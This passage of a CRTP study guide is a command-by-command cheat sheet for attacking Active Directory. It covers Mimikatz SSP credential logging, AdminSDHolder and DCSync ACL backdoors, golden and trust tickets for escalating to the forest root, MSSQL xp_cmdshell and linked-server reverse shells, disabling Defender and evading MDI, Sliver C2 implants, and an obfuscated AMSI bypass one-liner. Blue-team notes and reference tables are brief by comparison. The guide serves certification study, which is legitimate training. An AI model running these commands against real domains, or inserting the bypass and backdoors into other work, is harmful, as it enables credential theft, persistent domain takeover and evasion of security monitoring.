### Custom SSP via Mimikatz (Memory Patch)

```powershell
# In-memory injection (does NOT survive reboot):
Invoke-Mimikatz -Command '"misc::memssp"' -ComputerName dcorp-dc

# After injection, all logins are captured to:
# C:\Windows\system32\mimilsa.log

# Check captured credentials:
type C:\Windows\system32\mimilsa.log
```

### Custom SSP via Registry (Persistent)

```powershell
# Copy mimilib.dll to DC:
copy C:\AD\Tools\mimilib.dll \\dcorp-dc\c$\Windows\System32\

# Add to Security Packages registry:
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# After reboot of DC, all logons captured to mimilsa.log
```

---

## 22 Domain Persistence — ACL Backdoors

### AdminSDHolder — Protected Group Backdoor

```
╔═══════════════════════════════════════════════════════════════╗
║  AdminSDHolder is a special AD container that holds the      ║
║  template ACLs for "protected groups" (DA, EA, etc.).        ║
║                                                               ║
║  SDProp runs every 60 minutes and OVERWRITES the ACLs of     ║
║  all protected group members with the AdminSDHolder ACL.     ║
║                                                               ║
║  If we add ourselves to AdminSDHolder with GenericAll,       ║
║  SDProp will propagate that to ALL Domain Admins.            ║
║  → Persistent DA-equivalent rights, even after we are        ║
║    removed from DA group!                                    ║
╚═══════════════════════════════════════════════════════════════╝
```

```powershell
# Add student1 with GenericAll to AdminSDHolder:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
  -PrincipalIdentity student1 `
  -Rights All -Verbose

# Verify:
Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}

# Wait for SDProp to run (60 min) OR force it:
$sess = New-PSSession -ComputerName dcorp-dc
Invoke-Command -Session $sess -ScriptBlock {
    $InvokeReplicaSync = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    # Force SDProp via ldapsearch or registry
}

# Force SDProp manually via task:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {
    $cmd = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc " +
           [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Import-Module ActiveDirectory;$sd = Get-ADObject 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'; Set-ADObject 'CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -Replace @{nTSecurityDescriptor=$sd.nTSecurityDescriptor}"))
}

# After propagation, student1 has GenericAll on ALL Domain Admins
# Reset any DA's password using GenericAll:
Set-DomainUserPassword -Identity svcadmin -AccountPassword (ConvertTo-SecureString "NewPass@1234" -AsPlainText -Force)
```

### DCSync ACL Rights

```powershell
# Grant student1 DCSync rights (minimal rights, very stealthy):
Add-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -PrincipalIdentity student1 `
  -Rights DCSync -Verbose

# Verify:
Get-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1" -and $_.ObjectAceType -match "Replication"}

# Now perform DCSync as student1 (no DA required):
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 23 Domain Persistence — Security Descriptors

### Remote Registry Backdoor

```powershell
# Set security descriptor on DC's RemoteRegistry to allow student1 access:
Set-RemoteRegistryBackdoor -ComputerName dcorp-dc -Trustee 'dcorp\student1' -Verbose

# Now student1 can access DC's registry remotely without DA:
reg query \\dcorp-dc\HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

### WMI Security Descriptor

```powershell
# Allow student1 to use WMI on DC without DA:
Set-DomainObjectAcl -TargetIdentity "dcorp-dc" `
  -PrincipalIdentity student1 `
  -Rights All -Verbose

# OR using Set-RemoteWMI:
Set-RemoteWMI -ComputerName dcorp-dc -UserName 'dcorp\student1' -Verbose

# Now student1 can execute WMI on DC:
Get-WmiObject -Class Win32_OperatingSystem -ComputerName dcorp-dc
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\out.txt" -ComputerName dcorp-dc
```

### PSRemoting Security Descriptor

```powershell
# Allow student1 to PSRemote to DC without DA:
Set-RemotePSRemoting -ComputerName dcorp-dc -UserName 'dcorp\student1' -Verbose

# student1 can now run:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {whoami; hostname}
```

---

## 24 Cross-Domain Attacks — Child to Forest Root

### Understanding Forest Escalation

```
╔══════════════════════════════════════════════════════════════════╗
║  CRTP Lab Structure:                                            ║
║                                                                 ║
║  dollarcorp.moneycorp.local  (child domain)                    ║
║         ↕ (bidirectional parent-child trust)                   ║
║  moneycorp.local             (forest root)                     ║
║                                                                 ║
║  Goal: Escalate from Domain Admin in dollarcorp                ║
║        to Enterprise Admin in moneycorp (forest root)          ║
║                                                                 ║
║  Two methods:                                                   ║
║  1. Krbtgt hash of child domain (+ SID of child)               ║
║  2. Trust ticket (inter-domain TGT using trust key)            ║
╚══════════════════════════════════════════════════════════════════╝
```

### Method 1: Child Domain krbtgt Hash → Forest Root

```powershell
# Step 1: Get child domain SID:
Get-DomainSID                              # S-1-5-21-CHILD_DOMAIN_SID
# Get Enterprise Admins SID (from forest root):
Get-DomainSID -Domain moneycorp.local      # S-1-5-21-FOREST_ROOT_SID
# Enterprise Admins RID is always 519: S-1-5-21-FOREST_ROOT_SID-519

# Step 2: Dump krbtgt hash of child domain (dollarcorp):
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# Step 3: Forge inter-realm Golden Ticket with SID history of Enterprise Admins:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-FOREST-ROOT-SID-519 /krbtgt:<CHILD_KRBTGT_AES256> /ptt"

# Parameters:
# /sid:    Child domain SID
# /sids:   SID to inject into SID history — use EA SID
#          This adds Enterprise Admins membership to the ticket!

# Step 4: Access forest root DC:
klist   # Verify ticket
ls \\mcorp-dc.moneycorp.local\c$
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local

# Step 5: DCSync on forest root:
.\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local" "exit"
```

### Method 2: Trust Ticket (Inter-Realm TGT)

```powershell
# Step 1: Get trust key (trust account hash) between child and parent:
.\SafetyKatz.exe "lsadump::trust /patch" "exit"
# Look for: [In]  moneycorp.local → NTLM hash (this is the trust key)
# OR via DCSync:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$" "exit"

# Step 2: Forge inter-realm TGT:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-FOREST-ROOT-SID-519 /rc4:<TRUST_NTLM_KEY> /service:krbtgt /target:moneycorp.local /ticket:trust_ticket.kirbi"

# Step 3: Get TGS using the inter-realm TGT:
.\Rubeus.exe asktgs /ticket:trust_ticket.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# Step 4: Access parent domain resources:
ls \\mcorp-dc.moneycorp.local\c$
```

---

## 25 Cross-Forest Trust Attacks

### Understanding External Trusts

```
╔═══════════════════════════════════════════════════════════════╗
║  External/Forest trust between:                              ║
║  moneycorp.local ↔ eurocorp.local                           ║
║                                                               ║
║  SID Filtering is usually ENABLED on external trusts        ║
║  → Blocks SID history injection                             ║
║                                                               ║
║  BUT: Kerberoasting across trusts still works.              ║
║  AND: If SID filtering misconfigured → SID history works.   ║
╚═══════════════════════════════════════════════════════════════╝
```

### Enumerate Cross-Forest

```powershell
# Enumerate users in the external forest:
Get-DomainUser -Domain eurocorp.local | select samaccountname
Get-DomainComputer -Domain eurocorp.local | select name,dnshostname
Get-DomainGroup -Domain eurocorp.local | select name

# Enumerate trusts:
Get-DomainTrust -Domain eurocorp.local
Get-ForestTrust

# Foreign Users (users from one domain with rights in another):
Get-DomainForeignGroupMember -Domain eurocorp.local
Get-DomainForeignUser
```

### Kerberoasting Across Forest Trust

```powershell
# If trust allows Kerberos auth, SPNs in trusted forest are roastable:
Get-DomainUser -SPN -Domain eurocorp.local | select samaccountname,serviceprincipalname

# Request ticket across trust:
.\Rubeus.exe kerberoast /domain:eurocorp.local /outfile:eurocorp_kerb.hash

# Crack:
hashcat -m 13100 eurocorp_kerb.hash rockyou.txt
```

### SID History Injection (If SID Filtering Disabled)

```powershell
# Check if SID filtering is enabled on trust:
Get-DomainTrust | select SourceName,TargetName,TrustAttributes
# FILTER_SIDS attribute present = SID filtering on
# If TREAT_AS_EXTERNAL is not set on forest trust → SID history injection may work

# If SID history injection works across forest:
# Add Enterprise Admins SID of target forest to our ticket's SID history:
.\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:moneycorp.local /sid:S-1-5-21-MCORP-SID /sids:S-1-5-21-EUROCORP-DOMAIN-SID-519 /krbtgt:<MCORP_KRBTGT> /ptt"

ls \\eu-dc.eurocorp.local\c$
```

---

## 26 MSSQL Server Attacks

### MSSQL in CRTP Context

```
╔══════════════════════════════════════════════════════════════╗
║  MSSQL servers are common in enterprise AD environments.    ║
║  They can be leveraged for:                                  ║
║  1. Code execution (via xp_cmdshell)                        ║
║  2. Credential theft                                         ║
║  3. Lateral movement via linked servers                     ║
║  4. Cross-forest attacks via database links                 ║
╚══════════════════════════════════════════════════════════════╝
```

### PowerUpSQL — MSSQL Enumeration

```powershell
# Load PowerUpSQL:
Import-Module C:\AD\Tools\PowerUpSQL\PowerUpSQL.ps1

# Discover MSSQL instances in the domain:
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Check accessible instances:
Get-SQLInstanceDomain | Get-SQLConnectionTest | ?{$_.Status -eq "Accessible"}

# Get server info:
Get-SQLServerInfo -Instance dcorp-mssql.dollarcorp.moneycorp.local

# Enumerate databases:
Get-SQLDatabase -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose

# Check for sysadmin role:
Get-SQLServerRoleMember -Instance dcorp-mssql -RolePrincipalName sysadmin

# Run automated audit:
Invoke-SQLAudit -Instance dcorp-mssql -Verbose
```

### Execute OS Commands via xp_cmdshell

```powershell
# Check if xp_cmdshell is enabled:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC xp_cmdshell 'whoami'"

# Enable xp_cmdshell if disabled (needs sysadmin):
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Execute OS commands:
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "whoami" -RawResults
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "net user /domain"
Invoke-SQLOSCmd -Instance dcorp-mssql -Command "powershell -enc <PAYLOAD>"
```

### Lateral Movement via Linked Servers

```powershell
# Find linked servers:
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Check link chain:
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

# Execute command on a linked server:
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql

# Direct query with linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "SELECT * FROM OPENQUERY([eu-sql], 'SELECT system_user')"

# Enable xp_cmdshell on linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('sp_configure ''xp_cmdshell'',1;reconfigure') AT eu-sql"

# Run command on linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('xp_cmdshell ''whoami''') AT eu-sql"

# Reverse shell via linked server:
Invoke-SQLQuery -Instance dcorp-mssql -Query "EXEC ('xp_cmdshell ''powershell -enc <B64_PAYLOAD>''') AT eu-sql"
```

---

## 27 Defenses & Detection Bypasses

### Microsoft Defender for Identity (MDI) — Understanding Detections

```
╔═══════════════════════════════════════════════════════════════╗
║  MDI (formerly Azure ATP) detects:                           ║
║  - Golden Ticket usage                                        ║
║  - DCSync requests                                            ║
║  - Kerberoasting (many TGS requests)                         ║
║  - Lateral movement patterns                                  ║
║  - Mimikatz usage                                             ║
║  - Pass-the-Hash / Overpass-the-Hash                         ║
║  - Skeleton Key injection                                     ║
║  - Directory service replication (DCSync)                    ║
╚═══════════════════════════════════════════════════════════════╝
```

### Bypassing MDI Detections

```powershell
# ── DCSync: Use AES256 instead of RC4/NTLM ────────────────────────────────
# MDI detects anomalous NTLM-encrypted DCSync
# Use /aes256 flag instead of /ntlm in all Mimikatz commands:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# In Rubeus, always use /aes256 for pth operations

# ── Kerberoasting: Limit requests ─────────────────────────────────────────
# MDI detects high volume of TGS requests
# Only request tickets for accounts we actually need:
.\Rubeus.exe kerberoast /user:svcadmin /nowrap    # Target specific accounts
.\Rubeus.exe kerberoast /rc4opsec                 # Request RC4 tickets to avoid detection

# ── Golden Ticket: Use Diamond Ticket instead ─────────────────────────────
# Diamond tickets are real KDC-issued tickets — much harder to detect
# See Module 18 for Diamond Ticket implementation

# ── Disable Defender (lab only — very noisy IRL): ─────────────────────────
Set-MpPreference -DisableRealtimeMonitoring $True

# Exclusion (stealthier than disabling):
Add-MpPreference -ExclusionPath "C:\AD\Tools"
Add-MpPreference -ExclusionProcess "powershell.exe"

# ── Bypass Defender via AV signature modification: ────────────────────────
# CRTP provides pre-modified tool versions:
# C:\AD\Tools\InvisiShell\          → PS logging bypass
# C:\AD\Tools\SafetyKatz.exe        → Mimikatz .NET port
# C:\AD\Tools\BetterSafetyKatz.exe  → Modified SafetyKatz
# C:\AD\Tools\Rubeus_4.0.0.exe      → Modified Rubeus
```

### Defense Strategies (Blue Team Notes)

```powershell
# ── Privileged Access Workstations (PAW) ─────────────────────────────────
# DAs should only log in from dedicated PAW machines
# Never log into non-DC machines with DA credentials

# ── Tiered Administration Model ───────────────────────────────────────────
# Tier 0: Domain Controllers, PKI, ADFS
# Tier 1: Servers
# Tier 2: Workstations

# ── Protected Users Security Group ───────────────────────────────────────
# Members cannot use NTLM, DES, or RC4 Kerberos
# Tickets are non-renewable and non-delegatable
# Credentials not cached on non-DC hosts
Add-ADGroupMember -Identity "Protected Users" -Members "DA_account"

# ── Enable Audit Policies for detection: ──────────────────────────────────
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# ── Detect Kerberoasting ─────────────────────────────────────────────────
# Event ID 4769 — Kerberos Service Ticket was requested
# Look for: Ticket Encryption Type = 0x17 (RC4) — modern services use AES

# ── Detect Golden Ticket ─────────────────────────────────────────────────
# Event ID 4768 — TGT requested
# Golden Ticket: Account Name != account in AD OR impossible logon times
# Ticket lifetime > 10 hours (default max) is suspicious
```

---

## 28 Sliver C2 Framework

### Why Sliver in CRTP?

```
╔══════════════════════════════════════════════════════════════╗
║  CRTP now includes Sliver C2 as an alternative to using     ║
║  standalone tools.                                           ║
║  Sliver provides:                                            ║
║  - Encrypted C2 channels (HTTPS, WireGuard, mTLS)          ║
║  - Session management across multiple targets               ║
║  - Built-in pivoting / port forwarding                      ║
║  - Armory (extension system for BOFs and aliases)           ║
║  - OPSEC-friendly features                                  ║
╚══════════════════════════════════════════════════════════════╝
```

### Sliver Setup

```bash
# Start Sliver server:
sliver-server

# Start Sliver client:
sliver

# Generate implant:
generate --http <LHOST>:443 --os windows --arch amd64 --format exe --name implant

# Generate with multiple C2:
generate --http <LHOST>:443 --http <LHOST>:80 --os windows --arch amd64 --format exe

# Start listener:
http --lhost 0.0.0.0 --lport 443

# Once implant runs on victim:
sessions         # List active sessions
use <session_id> # Interact with session
```

### Sliver Commands for CRTP

```
# In an active session:
info              # System information
whoami            # Current user
pwd; ls; cat      # File operations
shell             # Interactive shell
execute -o cmd /c whoami    # Execute command

# Process operations:
ps                # List processes
migrate <PID>     # Migrate to process

# Network:
netstat           # Active connections
ifconfig          # Network interfaces
portfwd add --remote 192.168.1.1:80 --local 127.0.0.1:8080   # Port forward
socks5 start --lport 1080     # SOCKS5 proxy

# Pivot:
pivots tcp --lport 9090       # Create pivot listener on implant

# OPSEC:
getprivs          # Token privileges
impersonate <user> # Impersonate token
make-token <user> <domain> <pass>  # Create logon session

# File transfer:
upload /kali/tool.exe C:\Windows\Temp\tool.exe
download C:\sensitive\file.txt /kali/

# Execute .NET assembly in memory:
execute-assembly /kali/Rubeus.exe kerberoast /outfile:kerb.hash
execute-assembly /kali/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
execute-assembly /kali/SharpHound.exe -c All
```

---

## 29 CRTP Exam Strategy & Checklists

### Exam Overview

```
╔═══════════════════════════════════════════════════════════════╗
║  24-HOUR HANDS-ON EXAM                                       ║
║  5 Target machines + 1 Foothold machine                      ║
║  Environment: Fully patched Windows + Defender + MDI active  ║
║  Goal: Complete all challenges                               ║
║  Report: Submit detailed solutions + mitigations             ║
║  No full writeup needed, but evidence required               ║
╚═══════════════════════════════════════════════════════════════╝

Exam lab:
  student (foothold)
    └── machine1  (domain member)
    └── machine2  (domain member)
    └── machine3  (domain member / DC)
    └── machine4  (parent domain DC / forest root)
    └── machine5  (additional domain / linked)
```

### Pre-Exam Setup Checklist

```
[ ] VPN connected — test ping to all machines
[ ] Start Invisi-Shell on student machine immediately
[ ] AMSI bypass in each new PS session
[ ] Prepare tools: SafetyKatz, Rubeus, PowerView, BloodHound, PowerUpSQL
[ ] Start Sliver server + listener (if using C2)
[ ] Set up Python HTTP server for file transfers
[ ] Open note-taking tool (Obsidian/CherryTree) — one folder per machine
[ ] Check: hostname, whoami, domain, DC name, domain SID
```

### Attack Path Order

```
PHASE 1: Enumerate Everything (DO NOT skip)
  [ ] Run PowerView: users, groups, ACLs, SPNs, delegation, trusts
  [ ] Run BloodHound SharpHound collection
  [ ] Analyze BloodHound: "Shortest Paths to DA"
  [ ] Identify: Kerberoastable users, AS-REP users, delegation
  [ ] Identify: Local admin rights for student1
  [ ] Identify: Interesting ACLs

PHASE 2: Get Local Admin (if not already)
  [ ] Run Find-LocalAdminAccess
  [ ] Check Jenkins / other apps for RCE
  [ ] Run PowerUp for local privesc

PHASE 3: Credential Collection
  [ ] PSRemote to accessible machines
  [ ] SafetyKatz logonpasswords on each accessible machine
  [ ] Look for high-value accounts (svcadmin, webadmin, etc.)

PHASE 4: Domain Privilege Escalation (pick the easiest path)
  [ ] Kerberoast → crack → use credentials
  [ ] Unconstrained delegation + PrintSpooler → steal DA TGT
  [ ] Constrained delegation → S4U to DA
  [ ] ACL abuse → add to DA group or DCSync rights

PHASE 5: Persistence (do this BEFORE moving to forest)
  [ ] DCSync → get krbtgt hash
  [ ] Forge Golden Ticket
  [ ] Add AdminSDHolder ACE
  [ ] Set DCSync ACL on domain object

PHASE 6: Cross-Domain (Child → Forest Root)
  [ ] Method 1: Child krbtgt + EA SID history → access forest root
  [ ] Method 2: Trust ticket

PHASE 7: Cross-Forest (if applicable)
  [ ] Enumerate trusts to eurocorp.local
  [ ] Kerberoast across trust
  [ ] SID history injection (if filtering disabled)
  [ ] MSSQL linked servers across forest

PHASE 8: Document + Report
  [ ] Screenshot for every step
  [ ] Include hostname + whoami in every screenshot
  [ ] Document mitigations for each technique
```

### Documentation Requirements for Each Machine

```
Per machine, document:
  ✓ Initial enumeration findings
  ✓ Attack path chosen (explain WHY)
  ✓ Commands run (exact copy-paste)
  ✓ Tool output (screenshots + text)
  ✓ Privilege obtained (screenshot: whoami + hostname)
  ✓ Credentials/hashes obtained
  ✓ Mitigation recommendation

Screenshot format:
  [whoami output]
  [hostname]
  [flag or proof of DA access]
  [ip config / domain info]
  All in ONE screenshot per machine.
```

### Quick Command Reference (Exam Day)

```powershell
# ── STARTUP SEQUENCE ─────────────────────────────────────────────────────
# 1. Run Invisi-Shell
C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat

# 2. AMSI bypass (run in every new PS session):
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# 3. Load PowerView:
. C:\AD\Tools\PowerView.ps1

# 4. Quick domain info:
Get-Domain; Get-DomainController; Get-DomainSID

# 5. Find local admin access:
Find-LocalAdminAccess

# 6. Enumerate ACLs:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student"}

# 7. Run BloodHound:
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose

# 8. Check Kerberoastable:
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 9. Check AS-REP roastable:
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 10. Check delegation:
Get-DomainComputer -Unconstrained | select samaccountname
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```

---

## 30 Essential Resources & Links

### Official Course

| Resource | URL |
| --- | --- |
| CRTP Course Page | https://www.alteredsecurity.com/adlab |
| Altered Security | https://www.alteredsecurity.com |
| Lab Portal | https://enterprisesecurity.io |
| CRTP FAQ Blog | https://www.alteredsecurity.com/post/certified-red-team-professional-crtp |
| Bootcamp Info | https://www.alteredsecurity.com/crtp-bootcamp |
| Certification Path (CRTP) | https://www.alteredsecurity.com/redteamlab |

### Core Tools Used in CRTP

| Tool | Use | URL |
| --- | --- | --- |
| PowerView | AD enumeration | https://github.com/PowerShellMafia/PowerSploit |
| BloodHound | Attack path mapping | https://github.com/BloodHoundAD/BloodHound |
| SharpHound | BloodHound data collection | https://github.com/BloodHoundAD/SharpHound |
| Rubeus | Kerberos ticket attacks | https://github.com/GhostPack/Rubeus |
| SafetyKatz | Mimikatz .NET port | https://github.com/GhostPack/SafetyKatz |
| Mimikatz | Credential extraction | https://github.com/gentilkiwi/mimikatz |
| PowerUpSQL | MSSQL attacks | https://github.com/NetSPI/PowerUpSQL |
| Powermad | Create machine accounts | https://github.com/Kevin-Robertson/Powermad |
| PowerUp | Local privesc | https://github.com/PowerShellMafia/PowerSploit |
| Invisi-Shell | Bypass PS logging | https://github.com/OmerYa/Invisi-Shell |
| Sliver C2 | Command & Control | https://github.com/BishopFox/sliver |
| MS-RPRN | PrintSpooler abuse | https://github.com/leechristensen/SpoolSample |

### Reference & Cheat Sheets

| Resource | URL |
| --- | --- |
| GTFOBins | https://gtfobins.github.io/ |
| HackTricks AD | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology |
| The Hacker Recipes | https://www.thehacker.recipes/ |
| adsecurity.org | https://adsecurity.org/ |
| harmj0y Blog (AD attacks) | https://blog.harmj0y.net/ |
| dirkjanm.io (delegation) | https://dirkjanm.io/ |
| CRTP GitHub Notes | https://github.com/0xJs/CRTP-cheatsheet |

### Understanding Kerberos (Deep Dive)

| Resource | URL |
| --- | --- |
| Kerberos Explained | https://adsecurity.org/?p=1389 |
| Kerberoasting Paper | https://www.blackhat.com/docs/us-14/materials/us-14-Ramiras-Kerberoasting.pdf |
| Golden Ticket Article | https://adsecurity.org/?p=1640 |
| AS-REP Roasting | https://blog.harmj0y.net/activedirectory/roasting-as-reps/ |
| Unconstrained Delegation | https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ |
| Constrained Delegation | https://posts.specterops.io/s4u2pwnage-132b798c7140 |
| RBCD | https://eladshamir.com/2019/01/28/Wagging-the-Dog.html |

### Lab Practice (CRTP-level boxes)

| Platform | Box/Path | URL |
| --- | --- | --- |
| Hack The Box | Forest, Monteverde, Cascade, Active | https://app.hackthebox.com |
| HTB Pro Labs | Offshore, RastaLabs | https://app.hackthebox.com/prolabs |
| TryHackMe | AD paths | https://tryhackme.com |
| OffSec PG | AD-focused boxes | https://www.offsec.com/labs/ |
| VulnHub | Throwback, Xtreme | https://vulnhub.com |

---

## Appendix A — Kerberos Deep Dive

### How Kerberos Authentication Works

```
╔═══════════════════════════════════════════════════════════════╗
║  KDC = Key Distribution Center (runs on DC)                  ║
║  Components: AS (Auth Service) + TGS (Ticket Granting Svc)  ╠══╗
║                                                               ║  ║
║  Step 1: AS-REQ                                              ║  ║
║    Client → KDC: "I want to authenticate, here's my hash"   ║  ║
║                                                               ║  ║
║  Step 2: AS-REP                                              ║  ║
║    KDC → Client: TGT (encrypted with krbtgt hash)           ║  ║
║                  + Session Key (encrypted with client hash)  ║  ║
║                                                               ║  ║
║  Step 3: TGS-REQ                                             ║  ║
║    Client → KDC: "I want access to SPN X, here's my TGT"   ║  ║
║                                                               ║  ║
║  Step 4: TGS-REP                                             ║  ║
║    KDC → Client: TGS (encrypted with SPN account's hash)    ║  ║
║                                                               ║  ║
║  Step 5: AP-REQ                                              ║  ║
║    Client → Service: "Here's my TGS"                        ║  ║
║                                                               ║  ║
║  Step 6: AP-REP                                              ║  ║
║    Service → Client: "Authenticated! Here's your session"   ╠══╝
╚═══════════════════════════════════════════════════════════════╝
```

### Attack Mapping to Kerberos Steps

```
Attack                   Step Abused
─────────────────────────────────────────────────
AS-REP Roasting      →  Step 2 (request AS-REP without pre-auth)
Kerberoasting        →  Step 4 (TGS encrypted with svc hash)
Pass-the-Ticket      →  Steps 3/5 (replay stolen TGT/TGS)
Golden Ticket        →  Step 2 (forge TGT with krbtgt hash)
Silver Ticket        →  Step 5 (forge TGS with svc hash)
Overpass-the-Hash    →  Step 1 (use NTLM hash to get TGT)
Unconstrained Deleg  →  Step 3 (cache user's TGT on server)
Constrained Deleg    →  Step 4 (S4U: impersonate user for TGS)
```

---

## Appendix B — PowerView Quick Reference Card

```powershell
# ═══ DOMAIN ═══════════════════════════════════════════════════
Get-Domain                      Get-DomainController
Get-DomainPolicy                Get-DomainSID

# ═══ USERS ════════════════════════════════════════════════════
Get-DomainUser                  Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Find-DomainUserLocation

# ═══ GROUPS ═══════════════════════════════════════════════════
Get-DomainGroup                 Get-DomainGroupMember -Identity "DA"
Get-DomainGroup -UserName <u>   Find-LocalAdminAccess

# ═══ COMPUTERS ════════════════════════════════════════════════
Get-DomainComputer              Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# ═══ SHARES ═══════════════════════════════════════════════════
Find-DomainShare                Find-InterestingDomainShareFile

# ═══ ACLs ═════════════════════════════════════════════════════
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Add-DomainObjectAcl             Set-DomainObjectOwner

# ═══ GPO ══════════════════════════════════════════════════════
Get-DomainGPO                   Get-DomainGPOLocalGroup
Get-DomainGPOUserLocalGroupMapping

# ═══ TRUSTS ═══════════════════════════════════════════════════
Get-DomainTrust                 Get-ForestTrust
Get-ForestDomain                Get-DomainForeignGroupMember

# ═══ MODIFY ═══════════════════════════════════════════════════
Set-DomainObject                Set-DomainUserPassword
Add-DomainGroupMember           Set-DomainObjectOwner
```

---

## Appendix C — Rubeus Quick Reference Card

```powershell
# ═══ KERBEROAST ════════════════════════════════════════════
.\Rubeus.exe kerberoast /outfile:k.hash
.\Rubeus.exe kerberoast /user:<user> /format:hashcat

# ═══ AS-REP ROAST ══════════════════════════════════════════
.\Rubeus.exe asreproast /format:hashcat /outfile:a.hash

# ═══ GET TGT ═══════════════════════════════════════════════
.\Rubeus.exe asktgt /user:<u> /aes256:<h> /ptt
.\Rubeus.exe asktgt /user:<u> /rc4:<h> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# ═══ S4U (CONSTRAINED DELEGATION) ═════════════════════════
.\Rubeus.exe s4u /user:<u> /aes256:<h> /impersonateuser:Administrator /msdsspn:cifs/<host> /ptt

# ═══ TICKETS ═══════════════════════════════════════════════
.\Rubeus.exe ptt /ticket:<base64_or_file>
.\Rubeus.exe dump /luid:<luid> /nowrap
.\Rubeus.exe monitor /interval:5 /nowrap

# ═══ GOLDEN/SILVER ═════════════════════════════════════════
.\Rubeus.exe golden /aes256:<krbtgt_h> /user:Admin /id:500 /domain:x /sid:S-1-5-.. /ptt
.\Rubeus.exe diamond /krbkey:<h> /user:<u> /password:<p> /domain:x /dc:<dc> /ptt

# ═══ HASH ══════════════════════════════════════════════════
.\Rubeus.exe hash /password:<p> /user:<u> /domain:<d>
```

---

*CRTP | Altered Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”*

By DarcHacker.

LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)
